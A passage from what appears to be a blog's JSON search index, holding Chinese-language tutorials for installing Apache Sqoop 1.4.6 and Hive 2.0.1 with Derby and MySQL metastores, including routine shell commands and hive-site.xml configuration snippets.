&#x53E6;&#x5916;&#xFF0C;&#x5176;&#x5728;&#x5B89;&#x5168;&#x6027;&#x80FD;&#x65B9;&#x9762;&#x4E5F;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x6539;&#x5584;&#xFF0C;&#x5728;sqoop1&#x4E2D;&#x6211;&#x4EEC;&#x7ECF;&#x5E38;&#x7528;&#x811A;&#x672C;&#x7684;&#x65B9;&#x5F0F;&#x5C06;HDFS&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5BFC;&#x5165;&#x5230;mysql&#x4E2D;&#xFF0C;&#x6216;&#x8005;&#x53CD;&#x8FC7;&#x6765;&#x5C06;mysql&#x6570;&#x636E;&#x5BFC;&#x5165;&#x5230;HDFS&#x4E2D;&#xFF0C;&#x5176;&#x4E2D;&#x5728;&#x811A;&#x672C;&#x91CC;&#x8FB9;&#x90FD;&#x8981;&#x663E;&#x793A;&#x6307;&#x5B9A;mysql&#x6570;&#x636E;&#x5E93;&#x7684;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#x7684;&#xFF0C;&#x5B89;&#x5168;&#x6027;&#x505A;&#x7684;&#x4E0D;&#x662F;&#x592A;&#x5B8C;&#x5584;&#x3002;&#x5728;sqoop2&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x901A;&#x8FC7;CLI&#x65B9;&#x5F0F;&#x8BBF;&#x95EE;&#x7684;&#x8BDD;&#xFF0C;&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#x4EA4;&#x4E92;&#x8FC7;&#x7A0B;&#x754C;&#x9762;&#xFF0C;&#x4F60;&#x8F93;&#x5165;&#x7684;&#x5BC6;&#x7801;&#x4FE1;&#x606F;&#x4E0D;&#x88AB;&#x770B;&#x5230;&#x3002; Sqoop&#x67B6;&#x6784;&#x5BF9;&#x6BD4; &#x5B89;&#x88C5;&#x90E8;&#x7F72;&#x79FB;&#x6B65;sqoop&#x5B98;&#x7F51;&#xFF1A;http://sqoop.apache.org/&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x73B0;&#x5728;&#x7684;&#x7A33;&#x5B9A;&#x7248;&#x672C;&#x662F;1.4.6&#xFF0C;1.99.7&#x4E0E;1.4.6&#x4E0D;&#x517C;&#x5BB9;&#xFF0C;&#x5E76;&#x4E14;1.99.7&#x4E0D;&#x9002;&#x7528;&#x4E8E;&#x751F;&#x4EA7;&#x90E8;&#x7F72;&#x3002;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x4E0B;&#x8F7D;1.4.6&#x7248;&#x672C;&#x3002; 1&#x3001;&#x4E0B;&#x8F7D;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;http://www-eu.apache.org/dist/sqoop/1.4.6/&#x4E0B;&#x8F7D; sqoop-1.4.6.bin__hadoop-1.0.0.tar.gz 2&#x3001;&#x89E3;&#x538B;&#x5B89;&#x88C5;12345tar -zxvf sqoop-1.4.6.bin__hadoop-1.0.0.tar.gz -C /datacd /datamv sqoop-1.4.6.bin__hadoop-1.0.0/ sqoop1chmod -R 775 /data/sqoop1chown -R hadoop:hadoop /data/sqoop1 3&#x3001;&#x914D;&#x7F6E;&#x73AF;&#x5883;&#x53D8;&#x91CF;123456vim /etc/profileexport SQOOP_HOME=/data/sqoop1export PATH=$PATH:$SQOOP_HOME/binsource /etc/profile 4&#x3001;&#x5176;&#x4ED6;&#x914D;&#x7F6E; &#xFF08;1&#xFF09;&#x4E0B;&#x8F7D;mysql&#x9A71;&#x52A8;&#x5305;&#xFF0C;mysql-connector-java-5.1.40-bin.jar&#xFF0C;&#x628A;jar&#x5305;&#x4E22;&#x5230;&#x5230;$SQOOP_HOME/lib&#x4E0B;&#x9762; &#xFF08;2&#xFF09;&#x63A5;&#x4E0B;&#x6765;&#x4FEE;&#x6539;sqoop&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6; 12345678910111213141516171819cd /data/sqoop1/confcp sqoop-env-template.sh sqoop-env.sh vim sqoop-env.sh # &#x6307;&#x5B9A;&#x5404;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x7684;&#x5B9E;&#x9645;&#x914D;&#x7F6E;# Set Hadoop-specific environment variables here.#Set path to where bin/hadoop is available#export HADOOP_COMMON_HOME=#Set path to where hadoop-*-core.jar is available#export HADOOP_MAPRED_HOME=#set the path to where bin/hbase is available#export HBASE_HOME=#Set the path to where bin/hive is available#export HIVE_HOME= 5&#x3001;&#x9A8C;&#x8BC1;&#x662F;&#x5426;&#x6210;&#x529F;12345# &#x5217;&#x51FA;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;sqoop list-databases --connect jdbc:mysql://ip:port --username username --password pwd# &#x5217;&#x51FA;&#x6570;&#x636E;&#x5E93;&#x6240;&#x6709;&#x8868;sqoop list-tables --connect jdbc:mysql://ip:port/dbname --username username --password pwd &#x94FE;&#x63A5;&#x76F8;&#x5173;&#x5927;&#x6570;&#x636E;&#x8FDB;&#x9636;&#x8BA1;&#x5212;http://wangxin123.com/2017/02/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E8%BF%9B%E9%98%B6%E8%AE%A1%E5%88%92/ Sqoop&#x4E0B;&#x8F7D;&#x5730;&#x5740;http://www-eu.apache.org/dist/sqoop/1.4.6/ Sqoop v1.4.6 &#x6587;&#x6863;http://sqoop.apache.org/docs/1.4.6/index.html","raw":null,"content":null,"categories":[{"name":"大数据","slug":"大数据","permalink":"http://www.wangxin123.com/categories/大数据/"}],"tags":[{"name":"Sqoop","slug":"Sqoop","permalink":"http://www.wangxin123.com/tags/Sqoop/"}]},{"title":"HIVE安装配置","slug":"HIVE安装配置","date":"2017-02-26T13:18:00.000Z","updated":"2017-02-28T06:45:24.458Z","comments":true,"path":"2017/02/26/HIVE安装配置/","link":"","permalink":"http://www.wangxin123.com/2017/02/26/HIVE安装配置/","excerpt":"Hive&#x7B80;&#x4ECB;Hive &#x57FA;&#x672C;&#x4ECB;&#x7ECD;Hive &#x5B9E;&#x73B0;&#x673A;&#x5236;Hive &#x6570;&#x636E;&#x6A21;&#x578B;Hive &#x5982;&#x4F55;&#x8F6C;&#x6362;&#x6210;MapReduceHive &#x4E0E;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#x7684;&#x533A;&#x522B;&#x4EE5;&#x4E0A;&#x8BE6;&#x89C1;&#xFF1A;https://chu888chu888.gitbooks.io/hadoopstudy/content/Content/8/chapter8.html Hive &#x548C; Hbase &#x7684;&#x533A;&#x522B;&#x8BE6;&#x89C1;&#xFF1A;http://www.cnblogs.com/justinzhang/p/4273470.html Hive&#x73AF;&#x5883;&#x6A21;&#x5F0F; &#x5185;&#x5D4C;&#x6A21;&#x5F0F;&#x5C06;&#x5143;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x5728;&#x672C;&#x5730;&#x5185;&#x5D4C;&#x7684; Derby &#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF0C;&#x8FD9;&#x662F;&#x4F7F;&#x7528; Hive &#x6700;&#x7B80;&#x5355;&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x7F3A;&#x70B9;&#x4E5F;&#x6BD4;&#x8F83;&#x660E;&#x663E;&#xFF0C;&#x56E0;&#x4E3A;&#x4E00;&#x4E2A;&#x5185;&#x5D4C;&#x7684; Derby &#x6570;&#x636E;&#x5E93;&#x6BCF;&#x6B21;&#x53EA;&#x80FD;&#x8BBF;&#x95EE;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x4E5F;&#x5C31;&#x610F;&#x5473;&#x7740;&#x5B83;&#x4E0D;&#x652F;&#x6301;&#x591A;&#x4F1A;&#x8BDD;&#x8FDE;&#x63A5;&#x3002; &#x672C;&#x5730;&#x6A21;&#x5F0F;&#x8FD9;&#x79CD;&#x6A21;&#x5F0F;&#x662F;&#x5C06;&#x5143;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x5728;&#x672C;&#x5730;&#x72EC;&#x7ACB;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF08;&#x4E00;&#x822C;&#x662F; MySQL&#xFF09;&#xFF0C;&#x8FD9;&#x7528;&#x5C31;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x591A;&#x4F1A;&#x8BDD;&#x548C;&#x591A;&#x7528;&#x6237;&#x8FDE;&#x63A5;&#x4E86;&#x3002; &#x8FDC;&#x7A0B;&#x6A21;&#x5F0F;&#x6B64;&#x6A21;&#x5F0F;&#x5E94;&#x7528;&#x4E8E; Hive &#x5BA2;&#x6237;&#x7AEF;&#x8F83;&#x591A;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x628A; MySQL &#x6570;&#x636E;&#x5E93;&#x72EC;&#x7ACB;&#x51FA;&#x6765;&#xFF0C;&#x5C06;&#x5143;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x5728;&#x8FDC;&#x7AEF;&#x72EC;&#x7ACB;&#x7684; MySQL &#x670D;&#x52A1;&#x4E2D;&#xFF0C;&#x907F;&#x514D;&#x4E86;&#x5728;&#x6BCF;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x90FD;&#x5B89;&#x88C5; MySQL &#x670D;&#x52A1;&#x4ECE;&#x800C;&#x9020;&#x6210;&#x5197;&#x4F59;&#x6D6A;&#x8D39;&#x7684;&#x60C5;&#x51B5;&#x3002; &#x4E0B;&#x8F7D;&#x5B89;&#x88C5;HIVEHive &#x662F;&#x57FA;&#x4E8E; Hadoop &#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E4B;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5B89;&#x88C5;Hive&#x4E4B;&#x524D;&#x5FC5;&#x987B;&#x786E;&#x4FDD; Hadoop &#x5DF2;&#x7ECF;&#x6210;&#x529F;&#x5B89;&#x88C5;&#x3002; &#x672C;&#x6B21;&#x6559;&#x7A0B;&#xFF0C;&#x4F7F;&#x7528;hive2.0.1&#x7248;&#x672C;&#xFF0C;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;http://mirrors.hust.edu.cn/apache/hive/hive-2.0.1/&#x4E0B;&#x8F7D;apache-hive-2.0.1-bin.tar.gz&#xFF0C;&#x89E3;&#x538B;&#x81F3;/data/hive 123tar -zxvf apache-hive-2.0.1-bin.tar.gz -C /datacd /datamv apache-hive-2.0.1-bin hive","keywords":null,"text":"Hive&#x7B80;&#x4ECB;Hive &#x57FA;&#x672C;&#x4ECB;&#x7ECD;Hive &#x5B9E;&#x73B0;&#x673A;&#x5236;Hive &#x6570;&#x636E;&#x6A21;&#x578B;Hive &#x5982;&#x4F55;&#x8F6C;&#x6362;&#x6210;MapReduceHive &#x4E0E;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#x7684;&#x533A;&#x522B;&#x4EE5;&#x4E0A;&#x8BE6;&#x89C1;&#xFF1A;https://chu888chu888.gitbooks.io/hadoopstudy/content/Content/8/chapter8.html Hive &#x548C; Hbase &#x7684;&#x533A;&#x522B;&#x8BE6;&#x89C1;&#xFF1A;http://www.cnblogs.com/justinzhang/p/4273470.html Hive&#x73AF;&#x5883;&#x6A21;&#x5F0F; &#x5185;&#x5D4C;&#x6A21;&#x5F0F;&#x5C06;&#x5143;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x5728;&#x672C;&#x5730;&#x5185;&#x5D4C;&#x7684; Derby &#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF0C;&#x8FD9;&#x662F;&#x4F7F;&#x7528; Hive &#x6700;&#x7B80;&#x5355;&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x7F3A;&#x70B9;&#x4E5F;&#x6BD4;&#x8F83;&#x660E;&#x663E;&#xFF0C;&#x56E0;&#x4E3A;&#x4E00;&#x4E2A;&#x5185;&#x5D4C;&#x7684; Derby &#x6570;&#x636E;&#x5E93;&#x6BCF;&#x6B21;&#x53EA;&#x80FD;&#x8BBF;&#x95EE;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x4E5F;&#x5C31;&#x610F;&#x5473;&#x7740;&#x5B83;&#x4E0D;&#x652F;&#x6301;&#x591A;&#x4F1A;&#x8BDD;&#x8FDE;&#x63A5;&#x3002; &#x672C;&#x5730;&#x6A21;&#x5F0F;&#x8FD9;&#x79CD;&#x6A21;&#x5F0F;&#x662F;&#x5C06;&#x5143;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x5728;&#x672C;&#x5730;&#x72EC;&#x7ACB;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF08;&#x4E00;&#x822C;&#x662F; MySQL&#xFF09;&#xFF0C;&#x8FD9;&#x7528;&#x5C31;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x591A;&#x4F1A;&#x8BDD;&#x548C;&#x591A;&#x7528;&#x6237;&#x8FDE;&#x63A5;&#x4E86;&#x3002; &#x8FDC;&#x7A0B;&#x6A21;&#x5F0F;&#x6B64;&#x6A21;&#x5F0F;&#x5E94;&#x7528;&#x4E8E; Hive &#x5BA2;&#x6237;&#x7AEF;&#x8F83;&#x591A;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x628A; MySQL &#x6570;&#x636E;&#x5E93;&#x72EC;&#x7ACB;&#x51FA;&#x6765;&#xFF0C;&#x5C06;&#x5143;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x5728;&#x8FDC;&#x7AEF;&#x72EC;&#x7ACB;&#x7684; MySQL &#x670D;&#x52A1;&#x4E2D;&#xFF0C;&#x907F;&#x514D;&#x4E86;&#x5728;&#x6BCF;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x90FD;&#x5B89;&#x88C5; MySQL &#x670D;&#x52A1;&#x4ECE;&#x800C;&#x9020;&#x6210;&#x5197;&#x4F59;&#x6D6A;&#x8D39;&#x7684;&#x60C5;&#x51B5;&#x3002; &#x4E0B;&#x8F7D;&#x5B89;&#x88C5;HIVEHive &#x662F;&#x57FA;&#x4E8E; Hadoop &#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E4B;&#x4E0A;&#x7684;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5B89;&#x88C5;Hive&#x4E4B;&#x524D;&#x5FC5;&#x987B;&#x786E;&#x4FDD; Hadoop &#x5DF2;&#x7ECF;&#x6210;&#x529F;&#x5B89;&#x88C5;&#x3002; &#x672C;&#x6B21;&#x6559;&#x7A0B;&#xFF0C;&#x4F7F;&#x7528;hive2.0.1&#x7248;&#x672C;&#xFF0C;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;http://mirrors.hust.edu.cn/apache/hive/hive-2.0.1/&#x4E0B;&#x8F7D;apache-hive-2.0.1-bin.tar.gz&#xFF0C;&#x89E3;&#x538B;&#x81F3;/data/hive 123tar -zxvf apache-hive-2.0.1-bin.tar.gz -C /datacd /datamv apache-hive-2.0.1-bin hive &#x914D;&#x7F6E;&#x73AF;&#x5883;&#x53D8;&#x91CF;123456789# &#x7F16;&#x8F91;&#x6587;&#x4EF6;vim /etc/profile# &#x6587;&#x4EF6;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;export HIVE_HOME=/data/hiveexport PATH=$HIVE_HOME/bin:$HIVE_HOME/conf:$PATH# &#x4F7F;&#x4FEE;&#x6539;&#x751F;&#x6548;source /etc/profile &#x5185;&#x5D4C;&#x6A21;&#x5F0F;&#xFF08;1&#xFF09;&#x4FEE;&#x6539; Hive &#x914D;&#x7F6E;&#x6587;&#x4EF6; Hive&#x5DE5;&#x7A0B;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E3A; hive-site.xml&#xFF0C;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8BE5;&#x6587;&#x4EF6;&#x5E76;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x9700;&#x8981;&#x62F7;&#x8D1D;&#x5B83;&#x7684;&#x6A21;&#x7248;&#x6765;&#x5B9E;&#x73B0;&#x3002;12cd /data/hive/confcp hive-default.xml.template hive-site.xml hive-site.xml&#x7684;&#x4E3B;&#x8981;&#x914D;&#x7F6E;&#x6709;1234567891011&lt;property&gt; &lt;name&gt;hive.metastore.warehouse.dir&lt;/name&gt; &lt;value&gt;/user/hive/warehouse&lt;/value&gt; &lt;description&gt;location of default database for the warehouse&lt;/description&gt;&lt;/property&gt;..&lt;property&gt; &lt;name&gt;hive.exec.scratchdir&lt;/name&gt; &lt;value&gt;/tmp/hive&lt;/value&gt; &lt;description&gt;HDFS root scratch dir for Hive jobs which gets created with write all (733) permission. For each connecting user, an HDFS scratch dir: ${hive.exec.scratchdir}/&amp;lt;username&amp;gt; is created, with ${hive.scratch.dir.permission}.&lt;/description&gt;&lt;/property&gt; hive.metastore.warehouse.dir&#x8BE5;&#x53C2;&#x6570;&#x6307;&#x5B9A;&#x4E86; Hive &#x7684;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x76EE;&#x5F55;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F4D;&#x7F6E;&#x5728; HDFS &#x4E0A;&#x9762;&#x7684; /user/hive/warehouse &#x8DEF;&#x5F84;&#x4E0B;&#x3002; hive.exec.scratchdir&#x8BE5;&#x53C2;&#x6570;&#x6307;&#x5B9A;&#x4E86; Hive &#x7684;&#x6570;&#x636E;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x76EE;&#x5F55;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F4D;&#x7F6E;&#x4E3A; HDFS &#x4E0A;&#x9762;&#x7684; /tmp/hive &#x8DEF;&#x5F84;&#x4E0B;&#x3002; hive-site.xml&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x4E0D;&#x9700;&#x4FEE;&#x6539;&#xFF0C;&#x6587;&#x4EF6;&#x914D;&#x7F6E;&#x8BE6;&#x89E3;&#x79FB;&#x6B65;&#xFF1A;https://my.oschina.net/HIJAY/blog/503842?p=1 &#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x8FD8;&#x8981;&#x4FEE;&#x6539;Hive&#x76EE;&#x5F55;&#x4E0B;&#x7684;/conf/hive-env.sh &#x6587;&#x4EF6;&#xFF0C;&#x8BE5;&#x6587;&#x4EF6;&#x9ED8;&#x8BA4;&#x4E5F;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x540C;&#x6837;&#x662F;&#x62F7;&#x8D1D;&#x5B83;&#x7684;&#x6A21;&#x7248;&#x6765;&#x4FEE;&#x6539;&#xFF1A; 12345678910111213cd /data/hive/confcp hive-env.sh.template hive-env.shvim hive-env.sh# &#x505A;&#x5982;&#x4E0B;&#x4FEE;&#x6539;export HADOOP_HEAPSIZE=1024# Set HADOOP_HOME to point to a specific hadoop install directoryHADOOP_HOME=/data/hadoop# Hive Configuration Directory can be controlled by:export HIVE_CONF_DIR=/data/hive/conf# Folder containing extra ibraries required for hive compilation/execution can be controlled by:export HIVE_AUX_JARS_PATH=/data/hive/lib &#xFF08;2&#xFF09;&#x521B;&#x5EFA;&#x5FC5;&#x8981;&#x76EE;&#x5F55; &#x524D;&#x9762;&#x6211;&#x4EEC;&#x770B;&#x5230; hive-site.xml &#x6587;&#x4EF6;&#x4E2D;&#x6709;&#x4E24;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x8DEF;&#x5F84;&#x3010;/user/hive/warehouse&#x3011;&#x4E0E;&#x3010;/tmp/hive&#x3011;&#x3002;&#x5207;&#x6362;&#x5230;hadoop &#x7528;&#x6237;&#x4E0B;&#x67E5;&#x770B;HDFS&#x662F;&#x5426;&#x6709;&#x8FD9;&#x4E9B;&#x8DEF;&#x5F84;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#xFF0C;&#x5C31;&#x65B0;&#x5EFA;&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x4E14;&#x7ED9;&#x5B83;&#x4EEC;&#x8D4B;&#x4E88;&#x7528;&#x6237;&#x5199;&#x6743;&#x9650;&#x3002;1234$ hadoop dfs -mkdir /user/hive/warehouse$ hadoop dfs -mkdir /tmp/hive$ hadoop dfs -chmod 777 /user/hive/warehouse$ hadoop dfs -chmod 777 /tmp/hive &#x5982;&#x679C;&#x4F60;&#x9047;&#x5230; no such file or directory &#x7C7B;&#x4F3C;&#x7684;&#x9519;&#x8BEF;&#xFF0C;&#x5C31;&#x4E00;&#x6B65;&#x4E00;&#x6B65;&#x65B0;&#x5EFA;&#x76EE;&#x5F55;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;12$ hadoop dfs -mkdir /tmp$ hadoop dfs -mkdir /tmp/hive &#x7136;&#x540E;&#x901A;&#x8FC7;&#x76F8;&#x5173;&#x547D;&#x4EE4;&#x68C0;&#x67E5;&#x662F;&#x5426;&#x65B0;&#x5EFA;&#x6210;&#x529F;&#xFF0C;&#x6BD4;&#x5982;&#x3010;hdfs dfs -lsr /&#x3011;&#x3002; &#xFF08;3&#xFF09;&#x8FD0;&#x884C; Hive &#x524D;&#x9762;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x63D0;&#x5230;&#x8FC7;&#xFF0C;&#x5185;&#x5D4C;&#x6A21;&#x5F0F;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x548C; Derby &#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6240;&#x4EE5;&#x65E0;&#x9700;&#x5176;&#x5B83;&#x7279;&#x522B;&#x4FEE;&#x6539;&#xFF0C;&#x5148; ./start-all.sh &#x542F;&#x52A8; Hadoop, &#x7136;&#x540E;&#x76F4;&#x63A5;&#x8FD0;&#x884C; hive&#xFF1A;12[root@iZwz9b62gfdv0s2e67yo8kZ /]$ cd /data/hive/bin/[root@iZwz9b62gfdv0s2e67yo8kZ bin]$ hive &#x4F60;&#x5F88;&#x53EF;&#x80FD;&#x4F1A;&#x9047;&#x5230;&#x4E0E;&#x3010;${system:java.io.tmpdir}&#x3011;&#x6709;&#x5173;&#x7684;&#x8FD9;&#x4E2A;&#x9519;&#x8BEF;&#xFF1A; &#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x662F;&#x4FEE;&#x6539; hive-site.xml &#x4E2D;&#x6240;&#x6709;&#x5305;&#x542B; ${system:java.io.tmpdir} &#x5B57;&#x6BB5;&#x7684; value&#x3002;&#x53EF;&#x81EA;&#x5DF1;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x6765;&#x66FF;&#x6362;&#x5B83;&#xFF0C;&#x4F8B;&#x5982; /data/hive/iotmp&#xFF0C;&#x540C;&#x65F6;&#x8D4B;&#x4E88;&#x76F8;&#x5173;&#x5199;&#x6743;&#x9650;&#x3002; &#x4FEE;&#x6539;&#x540E;&#x518D;&#x6B21;&#x542F;&#x52A8; hive&#xFF0C;&#x53EF;&#x80FD;&#x53C8;&#x9047;&#x5230;&#x6570;&#x636E;&#x5E93;&#x672A;&#x521D;&#x59CB;&#x5316;&#x7684;&#x9519;&#x8BEF;&#xFF1A; &#x6267;&#x884C;&#x4EE5;&#x4E0B;&#x547D;&#x4EE4;&#x521D;&#x59CB;&#x5316;&#x5373;&#x53EF;12cd /data/hive/bin./schematool -initSchema -dbType derby &#x7EE7;&#x7EED;&#x62A5;&#x9519;&#xFF1A;1234Initialization script hive-schema-2.0.0.derby.sqlError: FUNCTION &apos;NUCLEUS_ASCII&apos; already exists. (state=X0Y68,code=30000)org.apache.hadoop.hive.metastore.HiveMetaException: Schema initialization FAILED! Metastore state would be inconsistent !!*** schemaTool failed *** &#x8FD9;&#x4E2A;function&#x7684;&#x6784;&#x5EFA;&#x662F;&#x6570;&#x636E;&#x5E93;&#x521D;&#x59CB;&#x5316;&#x7684;&#x4E00;&#x90E8;&#x5206;&#xFF0C;&#x65E2;&#x7136;&#x5B58;&#x5728;&#x4E86;&#xFF0C;&#x5C31;&#x76F4;&#x63A5;&#x53BB;hive-schema-2.0.0-derby.sql&#x91CC;&#x9762;&#x6CE8;&#x91CA;&#x6389;&#x3010;CREATE FUNCTION&#x3011;&#x7684;&#x76F8;&#x5173;&#x8BED;&#x53E5;&#x597D;&#x4E86;&#x3002; &#x6CE8;&#x91CA;&#x540E;&#x518D;&#x6B21;&#x542F;&#x52A8;hive&#xFF0C;&#x5C31;ok&#x4E86; &#x672C;&#x5730;&#x6A21;&#x5F0F;&#xFF08;1&#xFF09;&#x5B89;&#x88C5; MySQL&#x6210;&#x529F;&#x5B89;&#x88C5;mysql&#x540E;&#x542F;&#x52A8;&#x670D;&#x52A1;&#xFF0C;&#x5E76;&#x521B;&#x5EFA;&#x540D;&#x4E3A;hive&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x518D;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;hive&#x7528;&#x6237;&#x4E3A;HIVE&#x6240;&#x7528;&#x3002;mysql&#x5B89;&#x88C5;&#x65B9;&#x6CD5;&#x8BE6;&#x89C1;&#xFF1A;MySQL&#x5B89;&#x88C5;&#x53CA;&#x5378;&#x8F7D; MySQL&#x5B89;&#x88C5;&#x540E;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x4E0B;&#x8F7D;&#x4E00;&#x4E2A;MySQL&#x7684;JDBC&#x9A71;&#x52A8;&#x5305;&#x3002;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x7684;&#x662F;mysql-connector-java-5.1.40-bin.jar&#xFF0C;&#x9700;&#x5C06;&#x5176;&#x590D;&#x5236;&#x5230;$HIVE_HOME/lib&#x76EE;&#x5F55;&#x4E0B;&#x3002;123$ tar -zxvf mysql-connector-java-5.1.40.tar.gz$ cd mysql-connector-java-5.1.40$ mv mysql-connector-java-5.1.40-bin.jar /data/hive/lib/ &#xFF08;2&#xFF09;&#x4FEE;&#x6539; hive-site.xml &#x914D;&#x7F6E;&#x6587;&#x4EF6; &#x6700;&#x540E;&#xFF0C;&#x4F9D;&#x7136;&#x662F;&#x4FEE;&#x6539; $HIVE_HOME/conf &#x4E0B;&#x7684; hive-site.xml &#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x9ED8;&#x8BA4;&#x7684; Derby &#x4FEE;&#x6539;&#x4E3A; MySQL : 1234567891011121314151617181920212223&lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt; //&#x6240;&#x8FDE;&#x63A5;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x5B9E;&#x4F8B; &lt;value&gt;jdbc:mysql://localhost:3306/hive&lt;/value&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionDriverName&lt;/name&gt; //&#x8FDE;&#x63A5;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x9A71;&#x52A8; &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionUserName&lt;/name&gt; //&#x8FDE;&#x63A5;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x7528;&#x6237;&#x540D; &lt;value&gt;hive&lt;/value&gt;&lt;/property&gt;&lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionPassword&lt;/name&gt; //&#x8FDE;&#x63A5;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801; &lt;value&gt;hive&lt;/value&gt;&lt;/property&gt; &#xFF08;3&#xFF09;&#x542F;&#x52A8; Hive &#x542F;&#x52A8; Hive &#x7684;&#x65B9;&#x5F0F;&#x540C;&#x5185;&#x5D4C;&#x6A21;&#x5F0F;&#x4E00;&#x6837;&#xFF0C;&#x9700;&#x5148;&#x521D;&#x59CB;&#x5316;&#x6570;&#x636E;&#x5E93;.12cd /data/hive/bin./schematool -initSchema -dbType mysql &#x7136;&#x540E;&#x8FD0;&#x884C;HIVE&#xFF0C;&#x53EF;&#x80FD;&#x53D1;&#x73B0;&#x8FD0;&#x884C;&#x4E0D;&#x6210;&#x529F;&#xFF0C;&#x5E76;&#x4E00;&#x76F4;&#x6536;&#x5230;&#x8B66;&#x544A; &#x4FEE;&#x6539;hive-site.xml&#x6587;&#x4EF6;&#x7684;javax.jdo.option.ConnectionURL&#x9009;&#x9879;&#x5373;&#x53EF;12345&lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt; //&#x6240;&#x8FDE;&#x63A5;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x5B9E;&#x4F8B; &lt;value&gt;jdbc:mysql://localhost:3306/hive?characterEncoding=utf8&amp;useSSL=false&lt;/value&gt;&lt;/property&gt; &#x518D;&#x6B21;&#x542F;&#x52A8;HIVE&#xFF0C;&#x4ECD;&#x7136;&#x62A5;&#x9519; &#x7ECF;&#x67E5;&#xFF0C;&#x518D;&#x6B21;&#x4FEE;&#x6539;javax.jdo.option.ConnectionURL&#x9009;&#x9879;&#xFF0C;&#x7136;&#x540E;&#x542F;&#x52A8;HIVE&#xFF0C;&#x53D1;&#x73B0;&#x542F;&#x52A8;&#x6210;&#x529F;&#x3002;12345&lt;property&gt; &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt; 